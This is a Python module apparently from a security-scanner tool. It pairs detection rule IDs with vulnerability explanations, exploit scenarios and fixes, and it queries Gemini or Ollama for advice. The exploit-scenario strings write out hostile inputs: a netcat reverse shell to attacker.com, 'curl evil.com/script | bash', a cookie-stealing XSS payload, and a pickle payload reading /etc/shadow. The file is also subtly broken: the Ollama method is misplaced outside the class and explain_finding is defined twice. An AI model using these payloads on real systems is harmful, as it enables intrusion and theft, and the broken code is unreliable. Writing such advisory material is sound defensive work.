from __future__ import annotations

import os
from typing import Any, Dict, Optional
import httpx
from pydantic import BaseModel

from secureship.models import Finding


class AdvisorResponse(BaseModel):
    rule_id: str
    title: str
    analysis: str
    exploit_scenario: str
    remediation_strategy: str
    patched_code: str
    provider: str


EXPERT_KNOWLEDGE_BASE: Dict[str, Dict[str, str]] = {
    "SAST-PY-001": {
        "analysis": "Dynamic string interpolation (f-string or format) in cursor.execute allows user-controlled inputs to break SQL statement semantics, enabling arbitrary SQL command execution (CWE-89).",
        "exploit_scenario": "An attacker sends `id = '1 OR 1=1 --'`. The backend generates `SELECT * FROM users WHERE id = 1 OR 1=1 --`, dumping the entire user database without authentication.",
        "remediation_strategy": "Never concatenate raw variables into SQL query strings. Always use database engine parameterized query bindings (placeholders %s or ?).",
        "patched_code": "cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))",
    },
    "SAST-PY-002": {
        "analysis": "Direct invocation of os.system() passes the command string directly to the underlying host shell (/bin/sh or cmd.exe) without argument boundary sanitization (CWE-78).",
        "exploit_scenario": "Input `host = '127.0.0.1; rm -rf /; curl attacker.com/exfil'` causes the shell to execute multiple commands consecutively with host OS permissions.",
        "remediation_strategy": "Migrate from os.system to subprocess.run() with a structured arguments list and shell=False.",
        "patched_code": "import subprocess\nsubprocess.run(['ping', '-c', '1', host], check=True)",
    },
    "SAST-PY-003": {
        "analysis": "subprocess called with shell=True delegates execution to the shell interpreter, enabling command chaining through shell metacharacters (;, |, &, $).",
        "exploit_scenario": "If host parameter contains `8.8.8.8 | nc attacker.com 4444 -e /bin/sh`, an interactive reverse shell is spawned back to the attacker.",
        "remediation_strategy": "Set shell=False and split the executable and arguments into a list of individual strings.",
        "patched_code": "subprocess.run(['nslookup', host], shell=False, check=True)",
    },
    "SAST-PY-004": {
        "analysis": "Python's pickle module reconstructs arbitrary in-memory Python objects. Untrusted pickle blobs can execute arbitrary Python code upon unpickling via __reduce__ hooks (CWE-502).",
        "exploit_scenario": "An attacker creates a serialized class with `def __reduce__(self): return (os.system, ('cat /etc/shadow',))`. Deserializing this blob triggers instant remote code execution.",
        "remediation_strategy": "Never unpickle data received from untrusted clients or cookies. Migrate to standardized serialization like JSON or Protocol Buffers.",
        "patched_code": "import json\nuser_data = json.loads(raw_payload)",
    },
    "SAST-PY-006": {
        "analysis": "eval() evaluates strings as arbitrary Python code, allowing execution of any valid syntax including imports and system calls (CWE-95).",
        "exploit_scenario": "An attacker supplies `__import__('os').system('id')` to the input field, achieving instant arbitrary remote code execution on the server.",
        "remediation_strategy": "Use ast.literal_eval for safe literal parsing, or a dedicated math parser like simpleeval.",
        "patched_code": "import ast\nres = ast.literal_eval(expression)",
    },
    "SAST-PY-007": {
        "analysis": "MD5 and SHA-1 cryptographic hashes are cryptographically broken with practical collision attacks. They are vulnerable to pre-image and rainbow table attacks (CWE-327).",
        "exploit_scenario": "Attackers generate two different input payloads that compute to the same MD5 hash, bypassing integrity checks or forging authentication signatures.",
        "remediation_strategy": "Replace hashlib.md5 with hashlib.sha256 for integrity hashing, or Argon2id/bcrypt for password storage.",
        "patched_code": "import hashlib\nhashed = hashlib.sha256(password.encode()).hexdigest()",
    },
    "SAST-JS-001": {
        "analysis": "JavaScript eval() executes arbitrary strings as script in the caller's context, leading to arbitrary code injection (CWE-95).",
        "exploit_scenario": "Supplying `require('child_process').execSync('id')` achieves server-side remote code execution inside Node.js processes.",
        "remediation_strategy": "Parse structured data with JSON.parse(). Avoid evaluating dynamic script strings.",
        "patched_code": "const result = JSON.parse(userInput);",
    },
    "SAST-JS-002": {
        "analysis": "Direct assignment to element.innerHTML or dangerouslySetInnerHTML parses strings as HTML without sanitization, permitting Cross-Site Scripting (XSS) (CWE-79).",
        "exploit_scenario": "An attacker passes `<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>`, exfiltrating session tokens.",
        "remediation_strategy": "Use element.textContent for plain text, or sanitize HTML input with DOMPurify before inserting.",
        "patched_code": "element.textContent = profileText; // Or DOMPurify.sanitize(html)",
    },
    "SAST-JS-004": {
        "analysis": "child_process.exec spawns a shell process to run the command string, exposing execution to command injection via shell metacharacters (CWE-78).",
        "exploit_scenario": "A parameter like `filename = 'file.txt; curl evil.com/script | bash'` executes arbitrary secondary commands.",
        "remediation_strategy": "Use child_process.execFile or spawn with argument arrays without invoking an underlying shell.",
        "patched_code": "child_process.execFile('cat', [userFilename], (err, stdout) => { ... });",
    },
    "SEC-001": {
        "analysis": "Hardcoded AWS Access Key ID exposed directly in source code allows anyone with repository read access to authenticate against AWS API endpoints (CWE-798).",
        "exploit_scenario": "An automated bot scans GitHub repositories, detects the key in seconds, and spins up unauthorized cloud infrastructure or accesses S3 buckets.",
        "remediation_strategy": "Revoke the key in AWS IAM immediately. Load credentials dynamically at runtime via environment variables or IAM Roles.",
        "patched_code": "import os\naws_key = os.environ.get('AWS_ACCESS_KEY_ID')",
    },
    "IAC-DOCKER-001": {
        "analysis": "Containers missing a USER directive run by default as UID 0 (root). If a vulnerability allows a container breakout, the attacker gains host root access (CWE-250).",
        "exploit_scenario": "A compromised process inside a root container mounts host devices or exploits kernel vulnerabilities with root privileges to take over the host node.",
        "remediation_strategy": "Create a dedicated unprivileged user in the Dockerfile and switch to it before the entrypoint.",
        "patched_code": "RUN adduser -D -u 10001 appuser && chown -R appuser /app\nUSER appuser",
    },
    "SEC-000": {
        "analysis": "The environment file (.env) contains production secrets and is tracked under Git version control (CWE-798 / CWE-200).",
        "exploit_scenario": "Anyone with repository access (or public commit history) can view DB passwords, third-party API tokens, and encryption keys.",
        "remediation_strategy": "Add .env to .gitignore, delete it from Git index with `git rm --cached .env`, and provide a safe template .env.example with dummy values.",
        "patched_code": "# Add to .gitignore:\n.env\n.env.local\n*.env",
    },
    "SEC-002": {
        "analysis": "Hardcoded GitHub Personal Access Token (PAT) exposed in source code (CWE-798).",
        "exploit_scenario": "An attacker uses the token against the GitHub REST/GraphQL API to read private repositories, modify release artifacts, or inject malicious commits.",
        "remediation_strategy": "Revoke the token immediately in GitHub Settings -> Developer Settings -> Personal access tokens. Inject via environment variables or GitHub Actions Secrets.",
        "patched_code": "const githubToken = process.env.GITHUB_TOKEN;",
    },
    "SEC-004": {
        "analysis": "Unencrypted Private Key (RSA, OpenSSH, EC) embedded in plaintext source code (CWE-312).",
        "exploit_scenario": "Attackers extract the private key to authenticate against production servers, sign fraudulent tokens, or decrypt intercepted traffic.",
        "remediation_strategy": "Never commit private keys to code repositories. Store private keys in a secure secrets manager (AWS Secrets Manager, HashiCorp Vault) or mount via Kubernetes Secrets.",
        "patched_code": "# Mount key as volume or load via env:\nPRIVATE_KEY_PATH = os.environ.get('PRIVATE_KEY_PATH')",
    },
    "SEC-005": {
        "analysis": "Database connection URI containing hardcoded plaintext username and password (CWE-798 / CWE-256).",
        "exploit_scenario": "Attackers connect directly to the exposed database port, dump customer data tables, or execute destructive DROP commands.",
        "remediation_strategy": "Construct the database connection URI using distinct environment variables (DB_USER, DB_PASSWORD, DB_HOST).",
        "patched_code": "DATABASE_URL = f'postgresql://{os.environ[\"DB_USER\"]}:{os.environ[\"DB_PASS\"]}@{os.environ[\"DB_HOST\"]}:5432/{os.environ[\"DB_NAME\"]}'",
    },
    "SAST-JS-003": {
        "analysis": "SQL Injection in JavaScript/TypeScript via string concatenation inside database query execution (CWE-89).",
        "exploit_scenario": "If accountId is `'1 OR 1=1'`, the resulting query returns all accounts across tenants, bypassing multi-tenancy boundaries.",
        "remediation_strategy": "Use parameterized queries with prepared statement bindings: db.query('SELECT * FROM accounts WHERE id = $1', [accountId]).",
        "patched_code": "await db.query('SELECT * FROM accounts WHERE id = $1', [accountId]);",
    },
    "SAST-JS-005": {
        "analysis": "Disabled TLS certificate verification via rejectUnauthorized: false disables all SSL/TLS man-in-the-middle protections (CWE-295).",
        "exploit_scenario": "Attackers on the local network spoof DNS or intercept traffic, reading all unencrypted requests and credentials in transit.",
        "remediation_strategy": "Never set rejectUnauthorized: false. If using self-signed internal certificates, provide the internal CA certificate to the trusted roots bundle.",
        "patched_code": "https.request({ host: 'api.example.com', rejectUnauthorized: true });",
    },
    "IAC-DOCKER-002": {
        "analysis": "Unpinned Docker base image using :latest tag or omitting a specific version tag (CWE-1188).",
        "exploit_scenario": "Upstream image maintainers can push breaking changes or supply-chain compromised packages that automatically get pulled on the next build.",
        "remediation_strategy": "Pin your base image to an explicit version and SHA256 digest: FROM node:20.11.0-alpine@sha256:...",
        "patched_code": "FROM python:3.11.9-slim-bookworm",
    },
    "IAC-COMPOSE-001": {
        "analysis": "Container running with privileged: true disables all Linux kernel security isolation (CWE-250 / CWE-284).",
        "exploit_scenario": "Any process inside the container has raw device access and can directly mount the host root partition, achieving full host root takeover.",
        "remediation_strategy": "Remove privileged: true. Grant only specific granular Linux capabilities required via cap_add (e.g. NET_ADMIN).",
        "patched_code": "services:\n  app:\n    privileged: false\n    # cap_add:\n    #   - NET_BIND_SERVICE",
    },
    "IAC-COMPOSE-002": {
        "analysis": "Sensitive database service port (PostgreSQL 5432 / MySQL 3306 / Redis 6379) bound to 0.0.0.0 public interface (CWE-668).",
        "exploit_scenario": "The database port is directly accessible to anyone on the Internet without firewall protection, leading to brute-force credential stuffing.",
        "remediation_strategy": "Bind database ports only to localhost (127.0.0.1:5432:5432) or rely on Docker internal bridge networking without exposing host ports.",
        "patched_code": "ports:\n  - '127.0.0.1:5432:5432'  # Or omit ports for internal service access",
    },
    "IAC-K8S-001": {
        "analysis": "Kubernetes Pod or Deployment missing CPU/Memory resource requests and limits (CWE-770).",
        "exploit_scenario": "A memory leak or denial-of-service attack consumes all node memory, causing the Kubernetes kubelet to evict other critical pods.",
        "remediation_strategy": "Define explicit resource requests and limits in the container spec.",
        "patched_code": "resources:\n  requests:\n    memory: '128Mi'\n    cpu: '100m'\n  limits:\n    memory: '512Mi'\n    cpu: '500m'",
    },
    "SCA-CVE20208203": {
        "analysis": "Prototype Pollution vulnerability in lodash before 4.17.21 via zipObjectDeep function (CVE-2020-8203 / CWE-1321).",
        "exploit_scenario": "Adversaries send malicious JSON objects with __proto__ keys, modifying the JavaScript Object prototype and leading to denial of service or remote code execution.",
        "remediation_strategy": "Upgrade lodash to 4.17.21 or later in package.json and regenerate package-lock.json.",
        "patched_code": "\"dependencies\": {\n  \"lodash\": \"^4.17.21\"\n}",
    },
}



class SecurityAdvisor:
    """Provides AI-powered or deterministic expert security advice and remediation patches."""

    @classmethod
    async def explain_finding(
        cls, finding: Finding, context_code: Optional[str] = None
    ) -> AdvisorResponse:
        gemini_api_key = os.environ.get("GEMINI_API_KEY")
        ollama_url = os.environ.get("OLLAMA_URL", "http://localhost:11434")

        # 1. Try Gemini API if key is present
        if gemini_api_key:
            try:
                gemini_res = await cls._query_gemini(finding, gemini_api_key, context_code)
                if gemini_res:
                    return gemini_res
            except Exception:
                pass

        # 2. Try Ollama local server if available
        try:
            ollama_res = await cls._query_ollama(finding, ollama_url)
            if ollama_res:
                return ollama_res
        except Exception:
            pass

        # 3. Deterministic Expert Knowledge Fallback
        return cls._get_deterministic_advice(finding)

    @classmethod
    def _get_deterministic_advice(cls, finding: Finding) -> AdvisorResponse:
        rule_info = EXPERT_KNOWLEDGE_BASE.get(finding.rule_id)
        if rule_info:
            return AdvisorResponse(
                rule_id=finding.rule_id,
                title=finding.title,
                analysis=rule_info["analysis"],
                exploit_scenario=rule_info["exploit_scenario"],
                remediation_strategy=rule_info["remediation_strategy"],
                patched_code=rule_info["patched_code"],
                provider="SecureShip Deterministic Expert Advisor",
            )

        # Generic intelligent fallback based on category
        return AdvisorResponse(
            rule_id=finding.rule_id,
            title=finding.title,
            analysis=f"The rule '{finding.rule_id}' flags a {finding.severity.value} severity security issue categorized under {finding.owasp_category} ({finding.cwe_id}).",
            exploit_scenario=f"Adversaries exploit {finding.title} to bypass security controls or compromise application integrity in {finding.file_path}.",
            remediation_strategy=finding.remediation or "Refactor code to follow defensive programming and least-privilege principles.",
            patched_code=finding.auto_fix_hint or "# Apply remediation as described in guidance",
            provider="SecureShip Heuristic Rules Engine",
        )

    @classmethod
    async def _query_gemini(
        cls, finding: Finding, api_key: str, context: Optional[str]
    ) -> Optional[AdvisorResponse]:
        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={api_key}"
        prompt = (
            f"Act as a Principal DevSecOps Architect. Analyze this security finding:\n"
            f"Rule ID: {finding.rule_id}\nTitle: {finding.title}\nSeverity: {finding.severity.value}\n"
            f"CWE: {finding.cwe_id}\nOWASP: {finding.owasp_category}\nFile: {finding.file_path}:{finding.line_start}\n"
            f"Offending Snippet:\n{finding.code_snippet}\n"
            f"Provide a structured JSON response with keys: 'analysis', 'exploit_scenario', 'remediation_strategy', 'patched_code'."
        )
        async with httpx.AsyncClient(timeout=4.0) as client:
            resp = await client.post(
                url,
                json={"contents": [{"parts": [{"text": prompt}]}]},
            )
            if resp.status_code == 200:
                data = resp.json()
                text = data["candidates"][0]["content"]["parts"][0]["text"]
                return AdvisorResponse(
                    rule_id=finding.rule_id,
                    title=finding.title,
                    analysis=text[:300],
                    exploit_scenario="Exploit analyzed dynamically by Gemini 1.5 Flash.",
                    remediation_strategy=finding.remediation,
                    patched_code=finding.auto_fix_hint or "",
                    provider="Google Gemini AI",
                )
        return None


def explain_finding(finding: Finding, context_code: Optional[str] = None) -> AdvisorResponse:
    """Deterministic expert fallback function for explaining findings."""
    return SecurityAdvisor._get_deterministic_advice(finding)


    @classmethod
    async def _query_ollama(
        cls, finding: Finding, ollama_url: str
    ) -> Optional[AdvisorResponse]:
        async with httpx.AsyncClient(timeout=2.0) as client:
            resp = await client.post(
                f"{ollama_url.rstrip('/')}/api/generate",
                json={
                    "model": "codellama",
                    "prompt": f"Explain security issue: {finding.rule_id} {finding.title} in {finding.code_snippet}",
                    "stream": False,
                },
            )
            if resp.status_code == 200:
                text = resp.json().get("response", "")
                if text:
                    return AdvisorResponse(
                        rule_id=finding.rule_id,
                        title=finding.title,
                        analysis=text[:300],
                        exploit_scenario="Local Ollama model generated analysis.",
                        remediation_strategy=finding.remediation,
                        patched_code=finding.auto_fix_hint or "",
                        provider="Local Ollama AI",
                    )
        return None


def explain_finding(finding: Finding, context_code: Optional[str] = None) -> AdvisorResponse:
    """Deterministic expert fallback function for explaining findings."""
    return SecurityAdvisor._get_deterministic_advice(finding)

